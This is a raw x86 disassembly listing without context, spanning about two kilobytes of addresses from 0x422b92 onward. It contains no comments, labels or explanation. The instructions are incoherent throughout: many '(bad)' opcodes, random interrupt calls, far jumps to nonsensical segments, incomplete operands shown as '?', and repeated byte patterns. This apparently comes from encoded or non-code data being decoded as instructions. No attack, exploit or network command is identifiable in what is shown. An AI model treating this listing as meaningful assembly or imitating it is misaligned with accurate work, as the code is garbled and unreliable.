  422b92:	or     cl,BYTE PTR [ebp-0x5a72326b]
  422b98:	or     cl,BYTE PTR [ebp-0x5a29f563]
  422b9e:	pushf  
  422b9f:	stos   BYTE PTR es:[edi],al
  422ba0:	sahf   
  422ba1:	popa   
  422ba2:	mov    esp,0xc180804a
  422ba7:	mov    BYTE PTR [edi+0x649a62d9],al
  422bad:	mov    ecx,edx
  422baf:	rol    DWORD PTR [edx+0x70878492],cl
  422bb5:	int    0xc6
  422bb7:	or     eax,0x808169bd
  422bbc:	adc    dh,0x14
  422bbf:	int    0x76
  422bc1:	mov    ebp,0xd30de6cd
  422bc6:	lods   eax,DWORD PTR ds:[esi]
  422bc7:	xchg   DWORD PTR [ebx],esi
  422bc9:	retf   
  422bca:	ror    BYTE PTR [eax+0x7ae4cfa8],0x84
  422bd1:	in     al,dx
  422bd2:	push   esi
  422bd3:	int    0xc6
  422bd5:	or     eax,0xbd92c704
  422bda:	daa    
  422bdb:	add    DWORD PTR [eax-0x32e32980],0xe6cdbd76
  422be5:	or     eax,0xc087add3
  422bea:	mov    BYTE PTR [esi-0x30577740],bl
  422bf0:	gs jp  0x422b77
  422bf3:	add    DWORD PTR [eax-0x3ccf1380],0x80809284
  422bfd:	xchg   esi,esp
  422bff:	or     eax,0x699e30c0
  422c04:	add    BYTE PTR [ecx-0x72f57f80],0xb5
  422c0b:	xor    ebp,DWORD PTR [ebp+0x6c]
  422c0e:	int    0x10
  422c10:	mov    ebp,0x808081bc
  422c15:	int    0x7d
  422c17:	xor    ecx,DWORD PTR [edi]
  422c19:	xor    ah,0x81
  422c1c:	lea    esi,[ebp-0x7b8a19fc]
  422c22:	das    
  422c23:	add    al,0xd0
  422c25:	add    BYTE PTR [eax+0x75760480],0x8b
  422c2c:	int    0x8d
  422c2e:	mov    ch,0x4
  422c30:	cli    
  422c31:	test   BYTE PTR [edx-0x61783f79],al
  422c37:	int    0xe6
  422c39:	jge    0x422c0e
  422c3b:	xacquire xchg BYTE PTR [ebx],dh
  422c3e:	ins    DWORD PTR es:[edi],dx
  422c3f:	ins    BYTE PTR es:[edi],dx
  422c40:	shr    BYTE PTR [eax+ebp*4-0x31],0x65
  422c45:	outs   dx,DWORD PTR ds:[esi]
  422c46:	lods   al,BYTE PTR ds:[esi]
  422c47:	xchg   DWORD PTR [eax-0x42ef3280],eax
  422c4d:	inc    esp
  422c4e:	add    DWORD PTR [eax+0x337dcd80],0xaf4820f
  422c58:	lea    edi,[ebp+0x4a58d0a]
  422c5e:	cli    
  422c5f:	test   BYTE PTR [edx+0x402cd77],al
  422c65:	mov    dh,0xa5
  422c67:	and    ebx,0xa58d04ef
  422c6d:	xchg   edx,eax
  422c6e:	mov    es,WORD PTR [edx+edi*8]
  422c71:	dec    esi
  422c72:	ja     0x422c92
  422c74:	pop    ebp
  422c75:	rcl    DWORD PTR [edx-0x2ccc7f80],1
  422c7b:	int    0xf
  422c7d:	fidiv  DWORD PTR [esi-0x5a89785b]
  422c83:	jecxz  0x422c32
  422c85:	xchg   DWORD PTR [esi+0x7d],esi
  422c88:	or     dh,BYTE PTR [esi+0xd]
  422c8b:	in     al,dx
  422c8c:	inc    esi
  422c8d:	add    al,0xef
  422c8f:	test   BYTE PTR [ebp-0x7f7f7fc9],bh
  422c95:	jecxz  0x422c83
  422c97:	jecxz  0x422c4f
  422c99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422c9a:	pop    esi
  422c9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422c9c:	lods   eax,DWORD PTR ds:[esi]
  422c9d:	add    BYTE PTR [esi+0x3ea57600],0xa6
  422ca4:	lods   eax,DWORD PTR ds:[esi]
  422ca5:	mov    ss,esi
  422ca7:	mov    ebp,0x8086745d
  422cac:	add    BYTE PTR [edi+0x760a7d76],0xd
  422cb3:	shl    DWORD PTR [esi-0x7b3f7b5b],cl
  422cb9:	test   al,0x33
  422cbb:	add    BYTE PTR [edx-0x33],bh
  422cbe:	leave  
  422cbf:	int    0xc6
  422cc1:	or     eax,0x808059bd
  422cc6:	cmp    BYTE PTR ds:0x8987d481,0xe6
  422ccd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422cce:	jecxz  0x422cb9
  422cd0:	mov    ss,esi
  422cd2:	in     eax,dx
  422cd3:	in     al,dx
  422cd4:	add    BYTE PTR [eax],0x76
  422cd7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422cd8:	int    0x8d
  422cda:	mov    ch,0x4
  422cdc:	rcl    DWORD PTR [edx-0x32021933],cl
  422ce2:	leave  
  422ce3:	xor    esi,DWORD PTR [esi+0x34]
  422ce6:	pop    esi
  422ce7:	jbe    0x422c8e
  422ce9:	jnp    0x422c75
  422ceb:	int    0xf8
  422ced:	xor    edx,esi
  422cef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422cf0:	int    0x96
  422cf2:	cmp    al,0x45
  422cf4:	inc    ecx
  422cf5:	inc    ebx
  422cf6:	add    esi,DWORD PTR [edi-0x79]
  422cf9:	jle    0x422cd1
  422cfb:	clc    
  422cfc:	or     ah,dh
  422cfe:	std    
  422cff:	das    
  422d00:	pop    ecx
  422d01:	adc    DWORD PTR [ebx-0x1a],eax
  422d04:	cmp    al,0x2f
  422d06:	or     esp,DWORD PTR [edx-0x2]
  422d09:	add    BYTE PTR [eax],al
  422d0b:	mov    ebp,0x80808040
  422d10:	xor    ebp,DWORD PTR [ebp-0x31]
  422d13:	les    esi,FWORD PTR [esp+eiz*2]
  422d16:	int    0x96
  422d18:	sub    al,0xcd
  422d1a:	(bad)  
  422d1b:	stc    
  422d1c:	xor    edx,esi
  422d1e:	sbb    al,0xa
  422d20:	inc    edx
  422d21:	int    0x96
  422d23:	inc    esp
  422d24:	int    0xe6
  422d26:	std    
  422d27:	xor    esp,esi
  422d29:	xor    al,0xa
  422d2b:	pusha  
  422d2c:	retf   
  422d2d:	arpl   WORD PTR [eax-0x7fdb2d56],bp
  422d33:	test   al,0x9c
  422d35:	xor    ebp,DWORD PTR [ebp+0x6c]
  422d38:	in     al,dx
  422d39:	popf   
  422d3a:	adc    bh,ah
  422d3c:	add    BYTE PTR [eax-0x7e7d7e80],0xc5
  422d43:	shl    ebp,cl
  422d45:	mov    BYTE PTR [eax+0x43f9d6cd],bl
  422d4b:	(bad)  
  422d4c:	and    al,0x77
  422d4e:	mov    ch,0xcd
  422d50:	jbe    0x422cff
  422d52:	shr    DWORD PTR [ebp+0x760a4588],cl
  422d58:	lods   eax,DWORD PTR ds:[esi]
  422d59:	or     dl,dh
  422d5b:	stc    
  422d5c:	test   al,0xc5
  422d5e:	int    0x8d
  422d60:	jne    0x422d91
  422d62:	pop    ecx
  422d63:	ins    DWORD PTR es:[edi],dx
  422d64:	shl    edx,cl
  422d66:	test   BYTE PTR [edi-0x2c78428a],al
  422d6c:	in     al,dx
  422d6d:	xchg   BYTE PTR [edi],ch
  422d6f:	pop    ecx
  422d70:	ins    DWORD PTR es:[edi],dx
  422d71:	xchg   DWORD PTR [esi+0x75],esi
  422d74:	int    0xc6
  422d76:	jge    0x422d47
  422d78:	les    esi,FWORD PTR [esi-0x80]
  422d7b:	xor    ebp,DWORD PTR [ebp-0x31]
  422d7e:	les    esi,FWORD PTR [esi-0x80]
  422d81:	adc    bh,ah
  422d83:	add    BYTE PTR [eax+0x24778180],0xcd
  422d8a:	mov    WORD PTR [esp+ebx*2],?
  422d8d:	shl    DWORD PTR [esp+esi*1-0x73bc77d4],cl
  422d94:	xor    al,0xa4
  422d96:	ja     0x422dbd
  422d98:	retf   0x31
  422d9b:	je     0x422dd1
  422d9d:	pop    esp
  422d9e:	shl    ebp,cl
  422da0:	mov    BYTE PTR [ecx],cl
  422da2:	xchg   esp,eax
  422da3:	xor    al,0x2c
  422da5:	int    0xc
  422da7:	das    
  422da8:	mov    ebx,0xebd38096
  422dad:	push   ebx
  422dae:	das    
  422daf:	rcl    DWORD PTR [ebx],1
  422db1:	pop    esi
  422db2:	mov    WORD PTR [esp+ebp*1],?
  422db5:	ja     0x422dd1
  422db7:	int    0xdb
  422db9:	pop    edi
  422dba:	or     BYTE PTR [eax+0x13338080],0xd3
  422dc1:	jmp    0x422d48
  422dc3:	mov    eax,0x87808d81
  422dc8:	ins    DWORD PTR es:[edi],dx
  422dc9:	iret   
  422dca:	les    esi,FWORD PTR [esp+ebp*2]
  422dcd:	(bad)
  422dd0:	test   DWORD PTR [esi],edi
  422dd2:	mov    WORD PTR [esp+ebp*1],?
  422dd5:	xor    ebx,ebx
  422dd7:	mov    eax,0x8780963e
  422ddc:	ins    DWORD PTR es:[edi],dx
  422ddd:	add    al,0x6d
  422ddf:	or     edi,0xc56c34c4
  422de5:	cwde   
  422de6:	int    0xf0
  422de8:	mov    ebp,0xfcd9
  422ded:	int    0xd9
  422def:	int    0xf
  422df1:	jns    0x422d79
  422df3:	mov    bh,0xbd
  422df5:	sub    esp,edi
  422df7:	add    BYTE PTR [eax],al
  422df9:	cwde   
  422dfa:	int    0xf0
  422dfc:	jns    0x422e76
  422dfe:	test   DWORD PTR [ebx+0xfc6bbd],esp
  422e04:	add    BYTE PTR [eax-0x58798787],bl
  422e0a:	mov    ebp,0xfc38
  422e0f:	jns    0x422e89
  422e11:	xchg   edx,eax
  422e12:	cmp    eax,0xeceb99cd
  422e17:	add    eax,DWORD PTR [eax]
  422e19:	add    BYTE PTR [esi-0x12ed1233],dl
  422e1f:	inc    esp
  422e20:	add    DWORD PTR [eax-0x6893680],0x35862149
  422e2a:	leave  
  422e2b:	jbe    0x422de2
  422e2d:	inc    ecx
  422e2e:	and    DWORD PTR [esi-0x778932cb],eax
  422e34:	or     dh,BYTE PTR [esi-0x78]
  422e37:	int    0x76
  422e39:	stc    
  422e3a:	int    0x96
  422e3c:	stc    
  422e3d:	pop    ebx
  422e3e:	cwde   
  422e3f:	call   0xd3e3:0x3b9effc0
  422e46:	jmp    0x3586:0x21d1bf28
  422e4d:	cmp    eax,ebp
  422e4f:	sar    DWORD PTR [ebp+0xad25392],cl
  422e55:	jbe    0x422ecc
  422e57:	int    0x76
  422e59:	stc    
  422e5a:	int    0x96
  422e5c:	stc    
  422e5d:	cmp    eax,ebp
  422e5f:	sar    DWORD PTR [ebp-0x2c1cc46e],cl
  422e65:	jmp    0xfd76:0xad25328
  422e6c:	int    0x76
  422e6e:	stc    
  422e6f:	int    0x96
  422e71:	stc    
  422e72:	cmp    eax,ebp
  422e74:	sar    DWORD PTR [ebp-0x2c1cc46e],cl
  422e7a:	jmp    0xd076:0xad25328
  422e81:	int    0x76
  422e83:	stc    
  422e84:	int    0x96
  422e86:	stc    
  422e87:	cmp    eax,ebp
  422e89:	sar    DWORD PTR [ebp-0x2c1cc46e],cl
  422e8f:	jmp    0xbd76:0xad25328
  422e96:	leave  
  422e97:	jbe    0x422ec6
  422e99:	dec    ecx
  422e9a:	and    DWORD PTR [ebp+esi*1+0x496576c9],eax
  422ea1:	mov    al,ds:0x76c93586
  422ea6:	and    eax,0x35862169
  422eab:	sar    BYTE PTR [esp+ebx*4],0xa
  422eaf:	jbe    0x422e81
  422eb1:	or     dh,BYTE PTR [esi-0x30]
  422eb4:	sar    BYTE PTR [esp+ebx*4+0xad0760a],0x76
  422ebc:	ror    cl,1
  422ebe:	jbe    0x422e90
  422ec0:	jo     0x422e42
  422ec2:	add    BYTE PTR [eax+0x78d076c9],0x80
  422ec9:	add    BYTE PTR [eax-0x32068933],0x96
  422ed0:	stc    
  422ed1:	cmp    eax,ebp
  422ed3:	cmp    esp,ebx
  422ed5:	sar    DWORD PTR [ebp+0x28ead392],cl
  422edb:	push   ebx
  422edc:	ror    BYTE PTR [edx],cl
  422ede:	jbe    0x422eb0
  422ee0:	int    0x76
  422ee2:	stc    
  422ee3:	int    0x96
  422ee5:	stc    
  422ee6:	cmp    eax,ebp
  422ee8:	cmp    esp,ebx
  422eea:	sar    DWORD PTR [ebp+0x28ead392],cl
  422ef0:	push   ebx
  422ef1:	ror    BYTE PTR [edx],cl
  422ef3:	jbe    0x422ec5
  422ef5:	leave  
  422ef6:	jbe    0x422e8d
  422ef8:	arpl   WORD PTR [edx+0x76c98080],dx
  422efe:	lods   eax,DWORD PTR ds:[esi]
  422eff:	pop    esi
  422f00:	add    BYTE PTR [eax+0xd76c980],0xe6
  422f07:	add    BYTE PTR [eax-0xa983080],0xff
  422f0e:	add    BYTE PTR [eax],al
  422f10:	iret   
  422f11:	push   edi
  422f12:	xchg   ebp,eax
  422f13:	inc    DWORD PTR [eax]
  422f15:	add    BYTE PTR [ebp+0xff13],bh
  422f1b:	add    BYTE PTR [ebp+0xf3d60d],cl
  422f21:	lea    ebp,[ebp-0x72ff562a]
  422f27:	xchg   ebp,eax
  422f28:	(bad)  
  422f29:	fcmove st,st(1)
  422f2b:	jbe    0x422eda
  422f2d:	dec    esi
  422f2e:	ins    BYTE PTR es:[edi],dx
  422f2f:	add    BYTE PTR [eax-0x32068933],0x8d
  422f36:	stc    
  422f37:	cmp    eax,ebp
  422f39:	sar    DWORD PTR [ebp-0x57003f6e],cl
  422f3f:	cmp    ecx,DWORD PTR [edi]
  422f41:	shl    edx,cl
  422f43:	sub    BYTE PTR [ebx-0x2d],dl
  422f46:	or     dh,BYTE PTR [esi+0x6d]
  422f49:	int    0x76
  422f4b:	stc    
  422f4c:	int    0x8d
  422f4e:	stc    
  422f4f:	add    al,0xb6
  422f51:	cmc    
  422f52:	cmp    BYTE PTR [ebx],0xc5
  422f55:	sar    DWORD PTR [ebp-0x2cf0c46e],cl
  422f5b:	repnz sub BYTE PTR [ebx-0x2d],dl
  422f5f:	or     dh,BYTE PTR [esi-0x6b]
  422f62:	mov    ah,0xb1
  422f64:	sbb    al,0x80
  422f66:	add    BYTE PTR [eax-0x320a89f6],0x6c
  422f6d:	push   eax
  422f6e:	or     dh,BYTE PTR [esi-0x13]
  422f71:	int    0x6c
  422f73:	dec    esp
  422f74:	or     dh,BYTE PTR [esi+0x11]
  422f77:	int    0x76
  422f79:	mov    bh,cl
  422f7b:	(bad)  
  422f7c:	cmc    
  422f7d:	or     cl,BYTE PTR [ecx]
  422f7f:	rol    BYTE PTR [ecx+0x76cd8080],1
  422f85:	mov    bh,cl
  422f87:	(bad)  
  422f88:	in     eax,dx
  422f89:	or     cl,BYTE PTR [ecx]
  422f8b:	push   ebp
  422f8c:	add    DWORD PTR [eax-0x77893280],0xcf88d600
  422f96:	lea    edx,[ecx]
  422f98:	or     cl,BYTE PTR [ecx]
  422f9a:	pop    ebp
  422f9b:	add    DWORD PTR [eax+0x3eccbd80],0x8dcd8080
  422fa5:	stc    
  422fa6:	int    0x96
  422fa8:	stc    
  422fa9:	cmp    ecx,DWORD PTR [ebx+edi*1]
  422fac:	cdq    
  422fad:	shr    ebx,cl
  422faf:	xchg   edx,eax
  422fb0:	shr    edx,cl
  422fb2:	sub    BYTE PTR [ebx+0x13],dl
  422fb5:	inc    ebx
  422fb6:	jge    0x422fe7
  422fb8:	add    eax,0x808087ca
  422fbd:	int    0x76
  422fbf:	mov    ch,cl
  422fc1:	add    DWORD PTR ds:0xcd808081,esi
  422fc7:	mov    ch,cl
  422fc9:	jbe    0x422f53
  422fcb:	int    0x1
  422fcd:	xor    eax,0xcd808081
  422fd2:	add    BYTE PTR [edi-0x72329b92],0x88
  422fd9:	int    0xa
  422fdb:	adc    DWORD PTR [ecx+0x17cf8080],eax
  422fe1:	adc    al,0x0
  422fe3:	add    BYTE PTR [eax],al
  422fe5:	(bad)  
  422fe6:	int    0x96
  422fe8:	mov    ch,cl
  422fea:	mov    ds:0x80808125,al
  422fef:	int    0x22
  422ff1:	xchg   DWORD PTR [eax-0x7f7f7ff7],esi
  422ff7:	rol    BYTE PTR [eax+eax*1-0x7f7f3330],0x80
  422fff:	bound  eax,QWORD PTR [eax]
  423001:	jno    0x423027
  423003:	cmp    ebp,DWORD PTR [ebp-0x37]
  423006:	push   es
  423007:	push   esp
  423008:	add    BYTE PTR [eax],al
  42300a:	add    BYTE PTR [esi],cl
  42300c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42300d:	aad    0x49
  42300f:	leave  
  423010:	push   es
  423011:	pop    esp
  423012:	add    BYTE PTR [eax],al
  423014:	add    BYTE PTR [edi+0x35],dl
  423017:	adc    ebp,DWORD PTR [ebx+0x6406c9]
  42301d:	add    BYTE PTR [eax],al
  42301f:	mov    ds:0x79d735c1,eax
  423024:	push   es
  423025:	ins    BYTE PTR es:[edi],dx
  423026:	add    BYTE PTR [eax],al
  423028:	add    BYTE PTR [eax],bl
  42302a:	iret   
  42302b:	outs   dx,BYTE PTR ds:[si]
  42302d:	add    BYTE PTR [eax],al
  42302f:	add    BYTE PTR [edi+0x3b41afb8],ch
  423035:	ins    DWORD PTR es:[edi],dx
  423036:	leave  
  423037:	push   es
  423038:	sub    al,0x0
  42303a:	add    BYTE PTR [eax],al
  42303c:	push   cs
  42303d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42303e:	aad    0x49
  423040:	leave  
  423041:	push   es
  423042:	xor    al,0x0
  423044:	add    BYTE PTR [eax],al
  423046:	push   edi
  423047:	xor    eax,0x6c9ab13
  42304c:	cmp    al,0x0
  42304e:	add    BYTE PTR [eax],al
  423050:	mov    ds:0x79c335c1,eax
  423055:	push   es
  423056:	inc    esp
  423057:	add    BYTE PTR [eax],al
  423059:	add    BYTE PTR [eax],bl
  42305b:	iret   
  42305c:	addr16 inc esi
  42305e:	add    BYTE PTR [eax],al
  423060:	add    BYTE PTR [edi-0x32be5048],ch
  423066:	jbe    0x422ff0
  423068:	int    0x1
  42306a:	adc    DWORD PTR [ecx-0x19327f80],eax
  423070:	mov    BYTE PTR [ebp*2+0x35760a30],al
  423077:	int    0x76
  423079:	mov    ch,cl
  42307b:	add    DWORD PTR [ebp-0x7f],edi
  42307e:	add    BYTE PTR [eax+0x410176c9],0xa7
  423085:	mov    dl,0x35
  423087:	leave  
  423088:	jbe    0x42308f
  42308a:	mov    bh,0x3f
  42308c:	cmp    DWORD PTR [edi-0x48],eax
  42308f:	leave  
  423090:	jbe    0x42309b
  423092:	xlat   BYTE PTR ds:[ebx]
  423093:	sbb    cl,cl
  423095:	push   es
  423096:	les    eax,FWORD PTR [eax]
  423098:	add    BYTE PTR [eax],al
  42309a:	push   cs
  42309b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42309c:	aad    0x49
  42309e:	leave  
  42309f:	push   es
  4230a0:	nop
  4230a1:	add    BYTE PTR [eax],al
  4230a3:	add    BYTE PTR [edi+0x35],dl
  4230a6:	xlat   BYTE PTR ds:[ebx]
  4230a7:	inc    ecx
  4230a8:	leave  
  4230a9:	push   es
  4230aa:	aam    0x0
  4230ac:	add    BYTE PTR [eax],al
  4230ae:	cmp    DWORD PTR [ecx+0x57],ecx
  4230b1:	jge    0x42307c
  4230b3:	push   es
  4230b4:	fadd   QWORD PTR [eax]
  4230b6:	add    BYTE PTR [eax],al
  4230b8:	mov    cl,0x3f
  4230ba:	shl    DWORD PTR ds:0xe406c9,0x0
  4230c1:	add    BYTE PTR [edi-0x49],al
  4230c4:	xlat   BYTE PTR ds:[ebx]
  4230c5:	sbb    cl,cl
  4230c7:	push   es
  4230c8:	pushf  
  4230c9:	add    BYTE PTR [eax],al
  4230cb:	add    BYTE PTR [esi],cl
  4230cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4230ce:	aad    0x49
  4230d0:	leave  
  4230d1:	push   es
  4230d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4230d3:	add    BYTE PTR [eax],al
  4230d5:	add    BYTE PTR [edi+0x35],dl
  4230d8:	xlat   BYTE PTR ds:[ebx]
  4230d9:	inc    ecx
  4230da:	leave  
  4230db:	push   es
  4230dc:	lods   al,BYTE PTR ds:[esi]
  4230dd:	add    BYTE PTR [eax],al
  4230df:	add    BYTE PTR [ecx],bh
  4230e1:	dec    ecx
  4230e2:	push   edi
  4230e3:	jge    0x4230ae
  4230e5:	push   es
  4230e6:	mov    ah,0x0
  4230e8:	add    BYTE PTR [eax],al
  4230ea:	mov    cl,0x3f
  4230ec:	shl    DWORD PTR ds:0xbc06c9,0x0
  4230f3:	add    BYTE PTR [edi-0x49],al
  4230f6:	ret    
  4230f7:	sbb    BYTE PTR [ebp-0x7f7fc39d],bh
  4230fd:	jo     0x4230cc
  4230ff:	jbe    0x423136
  423101:	add    BYTE PTR [eax],dh
  423103:	int    0x76
  423105:	stc    
  423106:	int    0x8d
  423108:	stc    
  423109:	cmp    eax,ebp
  42310b:	cmp    ecx,DWORD PTR [edi]
  42310d:	shl    edx,cl
  42310f:	sub    bl,dl
  423111:	mov    ebp,0xcdd35392
  423116:	lea    ebp,[ebp+0x52fd343]
  42311c:	test   BYTE PTR [ecx+0x76cd8080],0xb5
  423123:	int    0x8d
  423125:	mov    ch,0x3b
  423127:	lds    edi,FWORD PTR [ebx]
  423129:	psrlq  mm6,mm2
  42312c:	sub    bl,dl
  42312e:	mov    ebp,0xcdd35392
  423133:	lea    ebp,[ebp+0x76cd7d33]
  423139:	ins    DWORD PTR es:[edi],dx
  42313a:	inc    ebx
  42313b:	shr    DWORD PTR [edi],cl
  42313d:	or     ch,dl
  42313f:	add    DWORD PTR [eax+0x3d76c980],0x80808080
  423149:	int    0x76
  42314b:	mov    ch,cl
  42314d:	rcl    BYTE PTR [ecx],1
  42314f:	add    DWORD PTR [eax-0x77193280],0xcd8876cd
  423159:	add    DWORD PTR [ebp-0x7f],esi
  42315c:	add    BYTE PTR [eax-0x7fc50943],0x80
  423163:	jo     0x423165
  423165:	cwde   
  423166:	xor    ch,cl
  423168:	lea    ecx,[eax-0x7ebaf533]
  42316e:	add    BYTE PTR [eax+0x76cd810a],0x88
  423175:	int    0x5d
  423177:	adc    DWORD PTR [ecx-0x29327f80],eax
  42317d:	mov    BYTE PTR [ebx],bh
  42317f:	ins    DWORD PTR es:[edi],dx
  423180:	iret   
  423181:	pop    ss
  423182:	pushf  
  423183:	add    BYTE PTR [eax],al
  423185:	add    BYTE PTR [ebp-0x7f7fc36e],bh
  42318b:	jo     0x42315a
  42318d:	jbe    0x423117
  42318f:	int    0x1
  423191:	inc    ebp
  423192:	add    DWORD PTR [eax+0x500080],0x760a889a
  42319c:	adc    eax,0xcd8876cd
  4231a1:	pop    ebp
  4231a2:	adc    DWORD PTR [ecx-0x29327f80],eax
  4231a8:	mov    BYTE PTR [ebx],bh
  4231aa:	ins    DWORD PTR es:[edi],dx
  4231ab:	iret   
  4231ac:	pop    ss
  4231ad:	les    eax,FWORD PTR [eax]
  4231af:	add    BYTE PTR [eax],al
  4231b1:	mov    ebp,0x80803ad9
  4231b6:	jo     0x423185
  4231b8:	jbe    0x423142
  4231ba:	int    0x1
  4231bc:	inc    ebp
  4231bd:	add    DWORD PTR [eax+0x500080],0x76cd889a
  4231c7:	mov    ch,cl
  4231c9:	pop    ebp
  4231ca:	adc    DWORD PTR [ecx-0x29327f80],eax
  4231d0:	mov    BYTE PTR [ebx],bh
  4231d2:	ins    DWORD PTR es:[edi],dx
  4231d3:	iret   
  4231d4:	pop    ss
  4231d5:	push   esp
  4231d6:	add    BYTE PTR [eax],al
  4231d8:	add    BYTE PTR [ebp-0x7f7fc52f],bh
  4231de:	jo     0x4231ad
  4231e0:	jbe    0x42316a
  4231e2:	int    0x1
  4231e4:	inc    ebp
  4231e5:	add    DWORD PTR [eax+0x500080],0xb604889a
  4231ef:	pop    ebp
  4231f0:	or     BYTE PTR [edx],0x76
  4231f3:	xor    eax,0xc05d76cd
  4231f8:	push   ds
  4231f9:	cmp    ebx,edx
  4231fb:	sahf   
  4231fc:	clc    
  4231fd:	add    al,BYTE PTR [ecx]
  4231ff:	shr    BYTE PTR [esi+0x2f],cl
  423202:	pop    ecx
  423203:	shl    BYTE PTR [eax+0x0],cl
  423206:	xchg   esi,eax
  423207:	xor    eax,0x43d66d06
  42320c:	int    0x76
  42320e:	pop    ebp
  42320f:	add    al,0xad
  423211:	mov    eax,DWORD PTR [ebp*2-0x69ff8faf]
  423218:	adc    eax,0x40d46d06
  42321d:	int    0x76
  42321f:	mov    ch,cl
  423221:	pop    ebp
  423222:	adc    DWORD PTR [ecx-0x29327f80],eax
  423228:	mov    BYTE PTR [ebx],bh
  42322a:	ins    DWORD PTR es:[edi],dx
  42322b:	iret   
  42322c:	xchg   esi,eax
  42322d:	add    DWORD PTR [ebp-0x7f7fc560],edi
  423233:	jo     0x423202
  423235:	jbe    0x4231bf
  423237:	int    0x1
  423239:	cmp    eax,0x808081
  42323e:	push   eax
  42323f:	add    BYTE PTR [edx+0xd760a88],bl
  423245:	in     al,dx
  423246:	test   BYTE PTR [esi+esi*4],al
  423249:	or     eax,0x5d760080
  42324e:	add    al,0xe6
  423250:	pop    ebp
  423251:	sub    al,0x82
  423253:	sub    eax,0xcdb576cd
  423258:	lea    esi,[ebp-0x3f772933]
  42325e:	jmp    FWORD PTR [edx-0xfc43ac5]
  423264:	sar    DWORD PTR [ebp+0x28f2d392],cl
  42326a:	push   ebx
  42326b:	ror    edi,cl
  42326d:	pop    ss
  42326e:	cmc    
  42326f:	inc    DWORD PTR [eax]
  423271:	add    BYTE PTR [ebp-0x7f7fc5e8],bh
  423277:	jo     0x423246
  423279:	jbe    0x423274
  42327b:	int    0x8d
  42327d:	stc    
  42327e:	int    0xd6
  423280:	mov    BYTE PTR [ebx],bh
  423282:	lds    edi,FWORD PTR [ebx]
  423284:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  42328b:	push   ebx
  42328c:	ror    edi,cl
  42328e:	pop    ss
  42328f:	xchg   ebp,eax
  423290:	inc    DWORD PTR [eax]
  423292:	add    BYTE PTR [ebp-0x7f7fc70a],bh
  423298:	jo     0x42329a
  42329a:	xchg   esi,eax
  42329b:	or     eax,0xcdf98dcd
  4232a0:	xchg   esi,eax
  4232a1:	stc    
  4232a2:	cmp    ecx,DWORD PTR [ebx+edi*1]
  4232a5:	(bad)  
  4232a7:	jmp    0x42323b
  4232a9:	shr    edx,cl
  4232ab:	sub    BYTE PTR [ebx+0x13],dl
  4232ae:	inc    ebx
  4232af:	jge    0x423287
  4232b1:	mov    ecx,ecx
  4232b3:	jbe    0x4232f2
  4232b5:	add    DWORD PTR [eax+0x76cd8080],0xb58dcdb5
  4232bf:	cmp    eax,ebp
  4232c1:	sar    DWORD PTR [ebp-0x2c0fc46e],cl
  4232c7:	repnz sub BYTE PTR [ebx-0x2d],dl
  4232cb:	xchg   DWORD PTR [esi+0x6d],esi
  4232ce:	or     dh,BYTE PTR [esi+0x6d]
  4232d1:	int    0x76
  4232d3:	cmp    eax,0x1cd46d06
  4232d8:	int    0x76
  4232da:	mov    ch,0xcd
  4232dc:	lea    esi,[ebp-0xfc43ac5]
  4232e2:	sar    DWORD PTR [ebp+0x28f2d392],cl
  4232e8:	push   ebx
  4232e9:	rol    DWORD PTR [edi+0x760a9576],cl
  4232ef:	xchg   ebp,eax
  4232f0:	int    0x76
  4232f2:	mov    ch,0xcd
  4232f4:	lea    esi,[ebp-0xfc43ac5]
  4232fa:	shl    edx,cl
  4232fc:	sub    bl,dl
  4232fe:	mov    ebp,0xcdd35392
  423303:	lea    ebp,[ebp+0x76cd7d33]
  423309:	ins    DWORD PTR es:[edi],dx
  42330a:	inc    ebx
  42330b:	shr    DWORD PTR [edi],cl
  42330d:	pop    es
  42330e:	push   eax
  42330f:	inc    DWORD PTR [eax]
  423311:	add    al,al
  423313:	jmp    FWORD PTR [eax-0x326a8933]
  423319:	lea    ebp,[ebp+0x43]
  42331c:	jge    0x4232f4
  42331e:	xor    DWORD PTR [eax],eax
  423320:	(bad)  
  423321:	mov    bh,cl
  423323:	jbe    0x423322
  423325:	jo     0x4232e4
  423327:	stc    
  423328:	jl     0x4232aa
  42332a:	or     BYTE PTR [edx],0x76
  42332d:	jne    0x42331b
  42332f:	sbb    cl,ch
  423331:	jbe    0x4233a8
  423333:	int    0x8d
  423335:	mov    ch,0xcd
  423337:	xchg   esi,eax
  423338:	mov    ch,0x3b
  42333a:	or     al,0x3b
  42333c:	cdq    
  42333d:	shr    ebx,cl
  42333f:	xchg   edx,eax
  423340:	shr    edx,cl
  423342:	sub    BYTE PTR [ebx+0x13],dl
  423345:	push   ecx
  423346:	mov    ch,cl
  423348:	jbe    0x423343
  42334a:	int    0x8d
  42334c:	stc    
  42334d:	cmp    eax,ebp
  42334f:	cmp    ecx,DWORD PTR [edi]
  423351:	shl    edx,cl
  423353:	sub    bl,dl
  423355:	mov    ebp,0xcdd35392
  42335a:	lea    esi,[ebp+0x43]
  42335d:	shr    DWORD PTR [edi],cl
  42335f:	add    eax,0x80805300
  423364:	int    0x76
  423366:	stc    
  423367:	int    0x8d
  423369:	stc    
  42336a:	cmp    eax,ebp
  42336c:	cmp    ecx,DWORD PTR [edi]
  42336e:	shl    edx,cl
  423370:	sub    bl,dl
  423372:	mov    ebp,0xcdd35392
  423377:	(bad)  
  423378:	std    
  423379:	inc    ebx
  42337a:	shr    DWORD PTR [edi],cl
  42337c:	add    eax,0x808053ea
  423381:	int    0x76
  423383:	stc    
  423384:	int    0x8d
  423386:	stc    
  423387:	cmp    eax,ebp
  423389:	cmp    ecx,DWORD PTR [edi]
  42338b:	sar    DWORD PTR [ebp+0x28f2d392],cl
  423391:	push   ebx
  423392:	shr    esp,cl
  423394:	adc    al,0xcd
  423396:	lea    esi,[ebp+0x3bb596cd]
  42339c:	or     al,0x3b
  42339e:	cdq    
  42339f:	shr    ebx,cl
  4233a1:	xchg   edx,eax
  4233a2:	shr    edx,cl
